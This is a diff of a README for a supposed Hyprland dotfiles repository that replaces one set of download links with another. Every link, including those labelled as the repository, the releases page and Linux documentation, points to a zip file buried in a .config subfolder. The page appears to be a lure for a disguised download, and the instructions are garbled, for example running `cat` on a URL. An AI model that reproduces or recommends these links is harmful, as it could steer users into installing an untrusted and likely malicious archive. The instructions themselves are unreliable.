@@ -1,6 +1,6 @@
 # 🌈 hyprland-dotfiles - A Beautiful and Functional Setup
 
-[![Download](https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip%20Now-Visit%https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip)](https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip)
+[![Download](https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip%20Now-Visit%https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip)](https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip)
 
 ## 📖 Description
 
@@ -35,9 +35,9 @@ To get started with **hyprland-dotfiles**, you will first need to download the f
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the latest versions of the configuration files:
-   [Download Hyprland Dotfiles](https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip)
+   [Download Hyprland Dotfiles](https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip)
 
-2. **Select the Version:** Once on the Releases page, scroll down to find the latest version. Look for a file labeled with a `.zip` or `https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip` extension. These formats make it easy to extract the files.
+2. **Select the Version:** Once on the Releases page, scroll down to find the latest version. Look for a file labeled with a `.zip` or `https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip` extension. These formats make it easy to extract the files.
 
 3. **Download the Files:** Click the link for the file to start the download. Wait for the download to finish.
 
@@ -53,7 +53,7 @@ To get started with **hyprland-dotfiles**, you will first need to download the f
 
 7. **Follow Configuration Instructions:** Inside the folder, you'll find a README file that includes steps specific to setting up your configuration. Open this file with a text editor or by using the command:
    ```bash
-   cat https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip
+   cat https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip
    ```
 
 ### ✓ Final Steps
@@ -97,8 +97,8 @@ If you want to help improve this configuration:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip)
-- [Linux Documentation](https://raw.githubusercontent.com/rankaisekasi/hyprland-dotfiles/main/.config/wlogout/hyprland-dotfiles-v3.9.zip)
+- [GitHub Repository](https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip)
+- [Linux Documentation](https://github.com/rankaisekasi/hyprland-dotfiles/raw/refs/heads/main/.config/hypr/hyprland_dotfiles_v3.2.zip)
 
 ## 📧 Contact
 
